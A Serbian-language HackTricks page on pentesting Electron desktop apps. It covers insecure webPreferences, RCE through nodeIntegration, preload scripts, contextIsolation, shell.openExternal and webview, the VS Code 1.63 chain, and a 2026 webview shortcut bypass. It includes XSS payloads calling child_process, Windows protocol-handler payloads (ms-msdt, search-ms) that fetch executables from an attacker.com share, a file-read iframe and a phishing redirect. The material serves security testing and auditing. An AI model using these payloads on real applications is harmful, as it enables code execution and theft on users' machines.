# Electron desktop aplikacije

{{#include ../../banners/hacktricks-training.md}}

## Uvod

Electron kombinuje privilegovani glavni proces **Node.js**-a sa **Chromium** renderer procesima. Electron nije veb pregledač: kod aplikacije može namerno da izloži mogućnosti kao što su pristup sistemu datoteka i shell-u, pa učitavanje nepouzdanog sadržaja zahteva strože osmišljene granice nego na običnom veb-sajtu.<sup>[[21]](#references)</sup>

Kod Electron aplikacije se obično pakuje u `.asar` arhivu. Raspakujte je pre pregleda izvornog koda:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

`package.json` aplikacije određuje njenu glavnu ulaznu tačku. Ta datoteka obično kreira prozore renderer-a i podešava njihove bezbednosno osetljive `webPreferences`.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron ima dva glavna tipa procesa:

- Glavni proces (ima potpun pristup NodeJS-u)
- Proces za prikazivanje (iz bezbednosnih razloga trebalo bi da ima ograničen pristup NodeJS-u)

![Electron Desktop Apps - Uvod: Proces za prikazivanje (iz bezbednosnih razloga trebalo bi da ima ograničen pristup NodeJS-u)](<../../images/image (182).png>)

**Proces za prikazivanje** je prozor pregledača koji učitava datoteku:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**Glavni proces** konfiguriše svaki proces za renderovanje, obično prilikom kreiranja objekta `BrowserWindow`. Bezbedna podešavanja smanjuju verovatnoću da kompromitovanje procesa za renderovanje dovede do izvršavanja izvornog koda, ali ne čine nepouzdan sadržaj sam po sebi bezbednim.<sup>[[21]](#references)[[22]](#references)</sup>

Pregledajte barem ove postavke procesa za renderovanje:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** je podrazumevano `false`. Njegovo uključivanje omogućava JavaScriptu u procesu za renderovanje pristup Node.js API-jima i ujedno onemogućava sandbox za taj proces.
- **`contextIsolation`** je podrazumevano `true`. Odvaja JavaScript kontekst stranice od konteksta koji koriste preload skripte i Electron interne komponente.
- **`preload`** podrazumevano nema putanju. Konfigurisana preload skripta se pokreće pre skripti stranice i može da izloži usko ograničene API-je preko `contextBridge`.
- **`sandbox`** je podrazumevano `true` od Electron verzije 20. Ograničava pristup procesa za renderovanje resursima operativnog sistema; postavljanje vrednosti `nodeIntegration: true` ga onemogućava.
- **`nodeIntegrationInWorker`** je podrazumevano `false` i kontroliše Node.js integraciju u Web Workers.
- **`nodeIntegrationInSubFrames`** je podrazumevano `false`.
  - Ako je **`nodeIntegration`** **omogućen**, to bi omogućilo korišćenje **Node.js API-ja** na veb-stranicama koje su **učitane u iframe-ovima** unutar Electron aplikacije.
  - Ako je **`nodeIntegration`** **onemogućen**, preload skripte će se učitavati u iframe-u

Primer konfiguracije:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Neki **RCE payloads** su [ovde](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Hvatanje saobraćaja

Izmenite konfiguraciju start-main i dodajte korišćenje proxy-ja, kao što je:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Statičko praćenje granice ASAR–native pomoću REA

**REA** može da pročita ASAR ili izdvojeni direktorijum aplikacije bez izvršavanja njenog JavaScript bootstrap-a. Graf aplikacije beleži ulazne tačke paketa, bundlovane module, podešavanja za `BrowserWindow` i preload, članove `contextBridge`, IPC registracije, zahteve za native add-on-ove i identitete source map-ova. To pruža polaznu tačku za praćenje mogućnosti dostupne renderer-u do privilegovanog handler-a glavnog procesa.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Za doslovni niz funkcije, prosledite kompletan Evidence zapis kao `application` i zamenite seed vrednošću uočenom na ciljnom sistemu:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Isti workflow `trace_application_feature` prihvata i uočeni literalni API član, IPC kanal ili modul kao početni element. Proverite rezultujuću putanju handlera, kandidate za validaciju i prosleđivanje native kodu u odnosu na vraćene lokacije izvornog koda. `invoke` iz renderer-a uparuje se samo sa jednim jedinstvenim kandidatom `ipcMain.handle`/`handleOnce` na istom tačnom literalnom kanalu; `send` slično zahteva jednog jedinstvenog kandidata `ipcMain.on`/`once`/`addListener`. Dinamički ili duplirani handleri ostaju nerazrešeni. Zahtevani član `.node` nije potvrđen native export; odgovarajući Hopper/Ghidra dokaz mora imati isti digest artefakta da bi se mogao izvesti taj zaključak. Statička dostižnost takođe ne dokazuje da je putanja izvršena.<sup>[[24]](#references)[[25]](#references)</sup>

Za granicu poverenja između renderer-a i main procesa i validaciju handlera, pogledajte [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md).

Za native dodatnu analizu zasnovanu na dokazima dobavljača, pogledajte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Površina napada pri automatskom ažuriranju Electron aplikacija

Za integritet release feed-a, rollback, zabunu oko potpisanih kanala i TOCTOU napade na staging datoteke, pogledajte [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md).

## Electron Local Code Injection

Ako imate lokalni pristup za pisanje ili instrumentaciju instalirane aplikacije, pogledajte [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) za putanje kroz ASAR/main proces i V8 snapshot, kao i linkove specifične za operativni sistem.

## RCE: XSS + nodeIntegration

Ako je **nodeIntegration** podešen na **on**, JavaScript veb-stranice može lako da koristi Node.js funkcije jednostavnim pozivanjem `require()`. Na primer, način za pokretanje aplikacije calc u Windows-u je:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Skripta navedena u ovoj postavci **učitava se pre drugih skripti u renderer-u**, tako da ima **neograničen pristup Node API-jima**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Dakle, skripta može da izveze node-features na stranice:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Ako je `contextIsolation` uključena, ovo neće raditi**

## RCE: XSS + contextIsolation

_**contextIsolation**_ uvodi **odvojene kontekste za skripte veb-stranice i interni JavaScript Electron-a**, tako da izvršavanje JavaScript-a u jednom kontekstu ne utiče na drugi. Ovo je neophodna funkcija za uklanjanje mogućnosti za RCE.

Ako konteksti nisu izolovani, napadač može da:

1. Izvrši **proizvoljan JavaScript u renderer-u** (XSS ili navigacija ka spoljnim sajtovima)
2. **Prepiše ugrađenu metodu** koju koristi preload ili interni kod Electron-a, svojom funkcijom
3. **Pokrene** korišćenje **prepisane funkcije**
4. RCE?

Postoje 2 mesta na kojima ugrađene metode mogu da budu prepisane: u preload kodu ili u internom kodu Electron-a:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Zaobilaženje događaja klika

Ako postoje ograničenja koja se primenjuju kada kliknete na link, možda ćete moći da ih zaobiđete **klikom srednjim tasterom miša** umesto uobičajenim klikom levim tasterom miša.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Za više informacija o ovim primerima pogledajte [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) i [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Prilikom instaliranja Electron desktop aplikacije, ključno je obezbediti ispravna podešavanja za `nodeIntegration` i `contextIsolation`. Utvrđeno je da ova podešavanja efikasno sprečavaju **izvršavanje udaljenog koda (RCE) na klijentskoj strani**, usmereno na preload skripte ili izvorni kod Electron-a iz glavnog procesa.

Kada korisnik klikne na linkove ili otvori nove prozore, aktiviraju se određeni osluškivači događaja, koji su ključni za bezbednost i funkcionalnost aplikacije:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Ovi listeneri su **nadjačani desktop aplikacijom** kako bi se implementirala njena sopstvena **poslovna logika**. Aplikacija procenjuje da li navigacioni link treba otvoriti unutar aplikacije ili u spoljašnjem web pregledaču. Ova odluka se obično donosi pomoću funkcije `openInternally`. Ako ova funkcija vrati `false`, to znači da link treba otvoriti spolja, koristeći funkciju `shell.openExternal`.

**Pojednostavljeni pseudokod:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS bezbednosne najbolje prakse savetuju da se funkciji `openExternal` ne prosleđuje nepouzdan sadržaj, jer to može dovesti do RCE-a putem različitih protokola. Operativni sistemi podržavaju različite protokole koji mogu pokrenuti RCE. Za detaljne primere i dodatna objašnjenja o ovoj temi, pogledajte [ovaj resurs](https://positive.security/blog/url-open-rce#windows-10-19042), koji uključuje primere Windows protokola koji mogu da iskoriste ovu ranjivost.<sup>[[10]](#references)</sup>

U macOS-u, funkcija `openExternal` može se iskoristiti za izvršavanje proizvoljnih komandi, na primer `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Primeri iskorišćavanja Windows protokola uključuju:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Ova ranjivost se može pronaći u **[ovom izveštaju](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** je **zastarela funkcija** koja omogućava korišćenje **NodeJS-a** u **renderer procesu**. Trebalo bi je onemogućiti jer omogućava učitavanje skripte unutar preload konteksta, na primer:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Stoga bi napadač koji uspe da učita proizvoljnu stranicu mogao da iskoristi tu oznaku za **učitavanje proizvoljne preload skripte**.

Ta preload skripta je zatim zloupotrebljena za pozivanje **ranjivog IPC servisa (`skype-new-window`)**, koji je pozivao **`shell.openExternal`** da bi se postigao RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Čitanje internih datoteka: XSS + contextIsolation

**Onemogućavanje opcije `contextIsolation` omogućava upotrebu oznaka `<webview>`**, slično kao kod `<iframe>`, za čitanje i eksfiltraciju lokalnih datoteka. U jednom primeru prikazano je kako da se iskoristi ova ranjivost za čitanje sadržaja internih datoteka:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Čitanje internih datoteka: XSS + contextIsolation: Onemogućavanje opcije contextIsolation omogućava upotrebu oznaka , slično kao kod , za...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Pored toga, opisan je još jedan način za **čitanje interne datoteke**, koji ukazuje na kritičnu ranjivost u Electron desktop aplikaciji za čitanje lokalnih datoteka. Ovaj način podrazumeva ubacivanje skripte kako bi se iskoristila aplikacija i eksfiltrirali podaci:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Stari Chromium**

Ako je verzija **Chromium** pregledača koja je uključena u aplikaciju stara i ima poznate ranjivosti, možda je moguće iskoristiti je i pretvoriti XSS u RCE.<sup>[[20]](#references)</sup>\
Primer možete videti u ovom **writeup**-u: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS Phishing putem regex bypass-a za interne URL-ove**

Ako pronađete XSS, ali **ne možete da pokrenete RCE ili ukradete interne fajlove**, i dalje možete pokušati da **ukradete akreditive putem phishing-a**.<sup>[[1]](#references)</sup>

Najpre pregledajte frontend kod da biste utvrdili šta se dešava kada se otvori novi URL:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Poziv funkcije **`openInternally`** određuje da li se platformska veza otvara u **desktop prozoru** ili se resurs treće strane otvara u sistemskom pregledaču.

Ako je moguće zaobići regex za allowlist URL-ova funkcije — na primer, zato što tačke u nazivu hosta nisu escapovane — napadač bi mogao da zloupotrebi XSS i prikaže uverljiv zahtev za unos akreditiva na infrastrukturi koju kontroliše:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Protokol `file://`

Kao što je navedeno u [Electron bezbednosnom vodiču](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), stranice koje se pokreću preko **`file://`** imaju širok pristup fajlovima. Zato se **XSS može iskoristiti za učitavanje proizvoljnih fajlova** sa korisnikove mašine. Ispravno dizajniran **prilagođeni protokol** može da ograniči pristup na određeni skup fajlova.<sup>[[21]](#references)</sup>

## Remote modul

Electron Remote modul omogućava **renderer procesima da pristupaju API-jima main procesa**, čime se olakšava komunikacija unutar Electron aplikacije. Međutim, uključivanje ovog modula uvodi značajne bezbednosne rizike. Proširuje površinu napada aplikacije, čineći je podložnijom ranjivostima kao što su napadi cross-site scripting (XSS).

> [!TIP]
> Iako **remote** modul izlaže neke API-je iz main procesa renderer procesima, nije jednostavno postići RCE isključivo zloupotrebom ovih komponenti. Međutim, komponente mogu da izlože osetljive informacije.

> [!WARNING]
> Mnoge aplikacije koje i dalje koriste remote modul to rade na način koji **zahteva da NodeIntegration bude omogućen** u renderer procesu, što predstavlja **veliki bezbednosni rizik**.

Electronov ugrađeni `remote` modul je zastareo, a zatim i uklonjen; aplikacije kojima je i dalje potreban njegov model mogu da koriste zaseban paket `@electron/remote`. Zbog bezbednosnih i performansnih posledica, izbegavajte izlaganje mogućnosti nalik remote modulu renderer procesima kojima se ne veruje.

Uz `@electron/remote`, prvo ga je potrebno **inicijalizovati u main procesu**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Renderer proces zatim može da uveze objekte iz modula:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[Objava na blogu](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** ukazuje na neke zanimljive **funkcije** koje izlaže objekat **`app`** iz remote modula:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Ponovo pokreće** aplikaciju tako što **izlazi** iz trenutne instance i **pokreće** novu. Korisno za **ažuriranja aplikacije** ili značajne **promene stanja**.
- **`app.setAppLogsPath([path])`**  
   - **Definiše** ili **kreira** direktorijum za skladištenje **app logova**. Logovi se mogu **preuzeti** ili **izmeniti** pomoću **`app.getPath()`** ili **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registruje** trenutnu izvršnu datoteku kao **podrazumevani handler** za navedeni **protokol**. Po potrebi možete navesti **prilagođenu putanju** i **argumente**.
- **`app.setUserTasks(tasks)`**  
   - **Dodaje** zadatke u **kategoriju Tasks** na **Jump List** (u Windows-u). Svaki zadatak može da odredi kako se aplikacija **pokreće** ili koji se **argumenti** prosleđuju.
- **`app.importCertificate(options, callback)`**  
   - **Uvozi** **PKCS#12 sertifikat** u sistemsko **skladište sertifikata** (samo Linux). Za obradu rezultata može se koristiti **callback**.
- **`app.moveToApplicationsFolder([options])`**  
   - **Premešta** aplikaciju u fasciklu **Applications** (na macOS-u). Pomaže da se obezbedi **standardna instalacija** za Mac korisnike.
- **`app.setJumpList(categories)`**  
   - **Postavlja** ili **uklanja** **prilagođeni Jump List** u **Windows-u**. Možete da navedete **kategorije** za organizovanje prikaza zadataka korisniku.
- **`app.setLoginItemSettings(settings)`**  
   - **Podešava** koje se **izvršne datoteke** pokreću pri **prijavljivanju**, zajedno sa njihovim **opcijama** (samo macOS i Windows).
  
Primer:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## modul systemPreferences

**Primarni API** za pristup sistemskim podešavanjima i **emitovanje sistemskih događaja** u Electronu. Metode kao što su **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** i **setUserDefault** sve su **deo** ovog modula.

**Primer upotrebe:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Osluškuje** **nativna macOS obaveštenja** koristeći NSDistributedNotificationCenter.  
* Pre **macOS Catalina**, mogao si da prisluškuješ **sva** distribuirana obaveštenja tako što proslediš **nil** funkciji CFNotificationCenterAddObserver.  
* Posle **Catalina / Big Sur**, aplikacije u sandboxu i dalje mogu da se **pretplate** na **mnoge događaje** (na primer, **zaključavanje/otključavanje ekrana**, **montiranje volumena**, **mrežnu aktivnost** itd.) tako što registruju obaveštenja **po imenu**.

### **getUserDefault / setUserDefault**

* **Interfejsira se** sa NSUserDefaults, koji čuva **podešavanja** aplikacije ili globalna podešavanja u macOS-u.
    
* **getUserDefault** može da **preuzme** osetljive informacije, kao što su **lokacije nedavno korišćenih datoteka** ili **geografska lokacija korisnika**.
    
* **setUserDefault** može da **izmeni** ova podešavanja, što potencijalno utiče na **konfiguraciju** aplikacije.
    
* U **starijim verzijama Electron-a** (pre v8.3.0), bio je **dostupan** samo **standardni skup** NSUserDefaults-a.

## Shell.showItemInFolder

Ova funkcija prikazuje datu datoteku u upravljaču datotekama. Na pogođenim platformama i verzijama, ta interakcija je **mogla automatski da izvrši datoteku**.

Za više informacija pogledajte [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Politika bezbednosti sadržaja

Electron aplikacije bi trebalo da imaju **Content Security Policy (CSP)** radi **sprečavanja XSS napada**. **CSP** je **bezbednosni standard** koji pomaže u **sprečavanju** **izvršavanja** **nepouzdanog koda** u pregledaču.

Obično se **konfiguriše** u datoteci **`main.js`** ili u šablonu **`index.html`**, tako što se CSP navede unutar **meta oznake**.

Za više informacija pogledajte:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: CSP webview-a + poverenje u postMessage + učitavanje lokalnih datoteka (VS Code 1.63)

Ovaj lanac napada iz stvarnog sveta pogodio je Visual Studio Code 1.63 (CVE-2021-43908) i pokazuje kako jedan XSS pokrenut markdown-om u webview-u može da se eskalira do potpunog RCE-a kada su CSP, postMessage i rukovaoci šemama pogrešno konfigurisani. Javni PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Pregled lanca napada
- Prvi XSS preko CSP-a webview-a: Generisani CSP je uključivao `style-src 'self' 'unsafe-inline'`, što je omogućilo ubacivanje zasnovano na inline stilovima u kontekstu `vscode-webview://`. Payload je slao beacon na `/stealID` kako bi eksfiltrirao extensionId ciljnog webview-a.
- Konstrukcija URL-a ciljnog webview-a: Korišćenje procurelog ID-a za pravljenje `vscode-webview://<extensionId>/.../<publicUrl>`.
- Drugi XSS preko poverenja u postMessage: Spoljašnji webview je verovao `window.postMessage` bez strogih provera origin-a/tipa i učitavao HTML napadača sa `allowScripts: true`.
- Učitavanje lokalnih datoteka preko prepisivanja šeme/putanje: Payload je prepisao `file:///...` u `vscode-file://vscode-app/...` i zamenio `exploit.md` sa `RCE.html`, zloupotrebljavajući slabu proveru putanje za učitavanje privilegovanog lokalnog resursa.
- RCE u kontekstu sa omogućenim Node-om: Učitani HTML se izvršavao uz dostupne Node API-je, što je omogućilo izvršavanje OS komandi.

Primer RCE primitiva u završnom kontekstu
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Povezano štivo o problemima poverenja u postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: sintetičke prečice za webview + deklarativni mostovi komandi ekstenzija

U junu 2026. pojavila se drugačija klasa zaobilaženja webview-a u VS Code-u: **nepouzdan JavaScript unutar webview-a za notebook/preview mogao je da simulira privilegovane globalne prečice**, jer je preload webview-a prosleđivao podatke o `keydown` događajima host workbench-u, a host ih je obrađivao kao stvarni korisnički unos.<sup>[[14]](#references)</sup>

Ovo je deo šire istorije napada na granice poverenja u IDE-ovima, gde sadržaj kojim upravlja projekat dolazi do privilegovanih funkcija editora.<sup>[[19]](#references)</sup>

### Greška na granici

Ako webview iz drugog origin-a ili u sandbox-u kopira napadačem kontrolisana polja tastature (`key`, `code`, `keyCode`, modifikatori, `repeat`) u privilegovani most `postMessage`/message-port **bez provere `event.isTrusted`**, JavaScript unutar webview-a može da izvršava workbench prečice pomoću:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Ovo je posebno korisno kada browser blokira **synthetic typing**. Skriptovani događaji tastera obično **ne mogu da unesu proizvoljan tekst u HTML elemente `<input>`**, ali i dalje mogu da aktiviraju prečice koje direktno obrađuju `keydown`.

### Praktični obrasci zloupotrebe

- **Zloupotreba korisničkog interfejsa putem prečica:** ciljajte globalne prečice, kao što su prihvatanje obaveštenja, navigacija kroz paletu, aktiviranje fokusiranog dugmeta ili kretanje kroz meni, umesto da pokušavate da unosite komande.
- **Predvidljivi privilegovani upiti na osnovu metapodataka radnog prostora:** datoteka `.vscode/extensions.json` pod kontrolom repozitorijuma može da preporuči ekstenziju napadača i izazove predvidljivo obaveštenje o instalaciji koje se može prihvatiti prečicom, kao što je `Ctrl+Shift+A`.
- **Deklarativni manifest ekstenzije kao most za komande:** čak i ako je CSP-om blokirano lokalno izvršavanje koda ekstenzije u web verziji VS Code-a, deklarativni unosi u `package.json` i dalje mogu da se učitaju. Lokalna ekstenzija u `.vscode/extensions` može da registruje keybinding koji poziva `runCommands`, a zatim privilegovanu internu komandu kao što je `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Primer obrasca manifesta:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Skrivene bezbednosne zastavice dostupne preko nepouzdanih metapodataka:** ako interna komanda prihvata argumente pod kontrolom napadača, kao što je `{"context":{"skipPublisherTrust":true}}`, deklarativni metapodaci mogu da potisnu dijalog za potvrdu poverenja i instaliraju ekstenziju sa Marketplace-a/CDN-a koja zatim izvršava kod napadača.
- **Zloupotreba pouzdanih radnih prostora:** ako se udaljenim/web radnim prostorima automatski veruje, ekstenzije lokalnog radnog prostora postaju vredan most od sadržaja repozitorijuma do privilegovanih radnji editora.
- **Proširivanje dometa nakon kompromitovanja:** nakon izvršavanja ekstenzije, proverite kojim tokenima editor omogućava pristup ekstenzijama. U `github.dev`-u, ukradeni GitHub token važio je i izvan otvorenog repozitorijuma, pa je upit ka `https://api.github.com/user/repos` izlistao dodatne privatne repozitorijume kojima je bilo moguće pristupiti.

### Napomene za reviziju

- Tretirajte **prosleđivanje ulaza iz webview-a hostu** kao granicu privilegija; nikada nemojte ponovo slati sintetičke događaje tastature/klika iz nepouzdanih okvira hostu.
- Sprovodite autorizaciju **unutar** osetljivih komandi. Ne prihvatajte kontekst komande koji dostavlja pozivalac i koji može da postavi interne zastavice kao što je `skipPublisherTrust`.
- Nemojte pretpostaviti da je blokiranje lokalnog izvršnog koda ekstenzija dovoljno; pregledajte i **deklarativne doprinose** (`keybindings`, `menus`, `commands`, zadatke) iz manifesta pod kontrolom radnog prostora.
- Ispravke od 3. juna 2026. dodale su `isTrusted` prosleđenim događajima, onemogućile prosleđivanje nepouzdanih događaja tastature u notebook webview-ovima i prestale da prihvataju kontekst komande za instalaciju koji dostavlja pozivalac.<sup>[[16]](#references)[[17]](#references)</sup>

## **Alati**

Kolekcija **awesome-electronjs-hacking** sadrži dodatne resurse za istraživanje, alate i ranjive aplikacije.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) je alat za prepoznavanje pogrešnih konfiguracija i bezbednosnih anti-patterna u aplikacijama zasnovanim na Electron-u.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) je open source VS Code dodatak za Electron aplikacije koji koristi Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) proverava ranjive biblioteke trećih strana.
- [**Electro.ng**](https://electro.ng/) je komercijalni alat za bezbednosnu analizu Electron aplikacija.

## Laboratorijske vežbe

Na [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) možete pronaći laboratorijsku vežbu za eksploataciju ranjivih Electron aplikacija.<sup>[[4]](#references)</sup>

Ove komande će vam pomoći da prođete kroz laboratorijsku vežbu:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Ranije objavljena adresa za postojeće obeleživače: [Electron desktop aplikacije](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ruta cele stranice preusmerava ovde; istorijski fragment se ne održava.

## References

- [1] [Phishing i prikupljanje akreditiva u Electron aplikacijama](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Čitanje proizvoljnih datoteka u Facebook Messenger Desktop aplikaciji](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
